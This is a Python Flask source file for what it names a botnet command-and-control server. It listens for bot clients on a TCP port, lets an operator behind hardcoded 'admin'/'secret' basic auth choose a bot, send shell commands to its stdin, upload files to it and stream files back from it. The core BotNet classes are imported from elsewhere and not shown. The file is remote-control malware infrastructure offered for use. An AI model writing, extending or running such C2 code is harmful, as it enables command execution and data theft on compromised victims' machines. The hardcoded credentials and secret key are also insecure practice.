import os
import socket
from flask import Flask, render_template, session, request, Response, stream_with_context
from flask_socketio import SocketIO, emit
from functools import wraps
import importlib
from werkzeug import secure_filename

# Loading library depends on how we want to setup the project later,
# for now this will do
try:
    from server.botnetclasses import *
except:
    from botnetclasses import *

''' See accompanying README for TODOs.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
connected = ''  # temp variable for testing
UPLOAD_FOLDER = 'static/uploads/'  # TODO
CLIENT_FILE = '../client/client.py' # TODO

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None


def check_auth(username, password):
    """This function is called to check if a username /
    password combination is valid.
    """
    return username == 'admin' and password == 'secret'  # TODO: set username and password


def authenticate():
    """Sends a 401 response that enables basic auth"""
    return Response(
        'Could not verify your access level for that URL.\n'
        'You have to login with proper credentials', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'})


@app.route('/uploader', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
        botnet.sendFile(connected,f.filename,f)
        # TODO switch to in-progress instead of "success"
        return json.dumps({"success": True})

@app.route('/downloader', methods=['GET'])
def download_file():
    filename = "example.txt"
    # Steam the file from the client (don't save locally)
    return Response(stream_with_context(botnet.startFileDownload(connected,filename)))

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated


@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
                           connected=connected)


@socketio.on('send_command', namespace='/bot')
def send_command(cmd):
    botnet.sendStdin(connected, cmd['data'] + '\n')

if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))

    botnet = BotNet(socketio)
    botserver = BotServer(TCPSOCK, botnet, socketio, CLIENT_FILE)

    botnet.start()
    botserver.start()

    socketio.run(app, debug=True, use_reloader=False)
